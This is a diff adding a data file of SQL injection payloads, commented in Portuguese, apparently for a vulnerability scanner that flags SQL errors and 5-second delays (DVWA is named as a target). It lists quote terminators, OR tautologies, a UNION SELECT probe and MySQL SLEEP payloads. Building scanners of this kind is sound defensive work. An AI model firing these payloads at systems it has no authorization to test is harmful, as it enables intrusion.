@@ -1,0 +1,20 @@
+# Payloads de SQL injection (issue #10). Uma linha por payload: id<TAB>value<TAB>descrição.
+# Linhas em branco e as iniciadas por '#' são ignoradas. O tipo de todo payload é SQL_INJECTION.
+#
+# Convenções de id:
+#   sqli-quote-* : aspas/terminadores que provocam erro de sintaxe no SGBD.
+#   sqli-error-* : condições que fazem o SGBD revelar mensagem de erro.
+#   sqli-time-*  : payloads temporais; o HeuristicDetector mede o atraso (limiar 5000 ms).
+#
+# SQLi booleana (comparar resposta "verdadeira" x "falsa") é follow-up: uma Evidence carrega
+# uma troca só, então o detector não compara. Os booleanos abaixo ficam comentados até lá:
+#   sqli-bool-true   1' AND '1'='1   condição verdadeira
+#   sqli-bool-false  1' AND '1'='2   condição falsa
+
+sqli-quote-1	'	aspas simples solta termina a string e quebra a sintaxe
+sqli-quote-2	"	aspas duplas soltas
+sqli-error-1	' OR '1'='1	tautologia clássica com aspas
+sqli-error-2	1' OR '1'='1' -- 	tautologia comentando o resto da query
+sqli-error-3	' UNION SELECT NULL -- 	union com contagem de colunas errada provoca erro
+sqli-time-mysql-5s	1' AND SLEEP(5)-- 	atraso de 5 s no MySQL/MariaDB (DVWA)
+sqli-time-mysql-or-5s	1' OR SLEEP(5)-- 	atraso de 5 s mesmo sem casar a linha
